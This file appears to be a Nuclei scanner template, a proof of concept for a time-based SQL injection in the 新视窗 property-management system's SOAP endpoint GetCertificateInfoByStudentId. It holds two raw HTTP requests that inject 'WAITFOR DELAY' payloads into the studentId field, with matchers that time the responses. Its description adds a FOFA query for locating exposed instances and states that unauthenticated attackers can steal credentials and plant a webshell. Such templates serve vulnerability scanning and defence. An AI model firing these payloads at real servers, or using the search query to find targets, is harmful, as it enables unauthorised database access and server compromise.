common/config/pocs/nuclei-2025/新视窗新一代物业管理系统-GetCertificateInfoByStudentId-SQL延时注入漏洞.yaml

http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=5 && duration_1<=6
            - duration_2>=8 && duration_2<=9
          type: dsl
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST  /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
          SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"
          Content-Type: text/xml; charset=utf-8

          <?xml version="1.0" encoding="utf-8"?>
          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
              <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
                <studentId>1;WAITFOR DELAY '0:0:5'--</studentId>
              </GetCertificateInfoByStudentId>
            </soap:Body>
          </soap:Envelope>
        - |
          POST  /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
          SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"
          Content-Type: text/xml; charset=utf-8

          <?xml version="1.0" encoding="utf-8"?>
          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
              <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
                <studentId>1;WAITFOR DELAY '0:0:8'--</studentId>
              </GetCertificateInfoByStudentId>
            </soap:Body>
          </soap:Envelope>
id: xinshichuang-GetCertificateInfoByStudentId-sql
info:
    author: Superhero
    description: |-
        fofa: body="BPMSite/ClientSupport/OCXInstall.aspx"
        新视窗新一代物业管理系统的XML Web services接囗GetCertifcatelnfoBvStudentld 实例处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 新视窗新一代物业管理系统 GetCertificateInfoByStudentId SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247484432&idx=1&sn=f5a51e56d377c247502cabeec17ae8ca&chksm=c267b123f5103835fd98444801160dfed22cc4e8a8f278a2b6e3570e541e16ca940fd5dca5cb&token=1619136955&lang=zh_CN#rd
    severity: high
    tags: []
